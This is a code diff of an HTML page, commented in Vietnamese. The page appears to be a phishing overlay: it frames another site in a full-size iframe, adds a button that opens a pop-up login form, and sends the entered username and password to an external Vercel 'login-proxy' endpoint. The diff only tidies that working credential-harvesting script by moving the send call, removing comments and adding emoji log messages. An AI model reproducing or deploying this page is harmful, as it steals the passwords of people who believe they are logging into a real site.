@@ -8,19 +8,16 @@
       margin: 0;
       padding: 0;
     }
-
     .container {
       position: relative;
       width: 100%;
       height: 800px;
     }
-
     iframe {
       width: 100%;
       height: 100%;
       border: none;
     }
-
     .overlay-button {
       position: absolute;
       top: 30px;
@@ -32,7 +29,6 @@
       z-index: 10;
       cursor: pointer;
     }
-
     .login-popup {
       display: none;
       position: fixed;
@@ -45,18 +41,15 @@
       padding: 20px;
       box-shadow: 0 0 10px rgba(0,0,0,0.4);
     }
-
     .login-popup input {
       display: block;
       margin: 10px 0;
       padding: 8px;
       width: 100%;
     }
-
     .login-popup button {
       padding: 8px 16px;
     }
-
     .overlay-background {
       display: none;
       position: fixed;
@@ -86,52 +79,41 @@
   </div>
 
   <script>
-    // Hiển thị form đăng nhập
     function showLogin() {
       document.getElementById('loginPopup').style.display = 'block';
       document.getElementById('overlayBg').style.display = 'block';
     }
 
-    // Ẩn form đăng nhập
     function hideLogin() {
       document.getElementById('loginPopup').style.display = 'none';
       document.getElementById('overlayBg').style.display = 'none';
     }
 
-    // Ngăn form submit mặc định và gửi dữ liệu qua XMLHttpRequest
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault(); // Ngăn form submit mặc định
+      e.preventDefault();
 
-      // Lấy dữ liệu từ form
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
-      // Tạo đối tượng XMLHttpRequest
       const xhr = new XMLHttpRequest();
       xhr.open('POST', 'https://login-proxy-vercel-d5jx.vercel.app/api/submit', true);
       xhr.setRequestHeader('Content-Type', 'application/json');
 
-      // Gửi dữ liệu
-      xhr.send(JSON.stringify({
-        username: username,
-        password: password
-      }));
-
-      // Xử lý phản hồi khi gửi thành công
       xhr.onload = function() {
         if (xhr.status >= 200 && xhr.status < 300) {
-          console.log('Dữ liệu đã được gửi:', xhr.responseText);
-          // Sau khi gửi, ẩn form
-          hideLogin();
+          console.log('✅ Dữ liệu đã được gửi:', xhr.responseText);
+          hideLogin(); // Ẩn form nếu gửi thành công
         } else {
-          console.error('Có lỗi khi gửi dữ liệu:', xhr.statusText);
+          console.error('❌ Lỗi khi gửi dữ liệu:', xhr.statusText);
         }
       };
 
-      // Xử lý lỗi nếu có
       xhr.onerror = function() {
-        console.error('Lỗi kết nối.');
+        console.error('❌ Lỗi kết nối hoặc CORS bị chặn');
       };
+
+      // Gửi dữ liệu JSON
+      xhr.send(JSON.stringify({ username, password }));
     });
   </script>
 
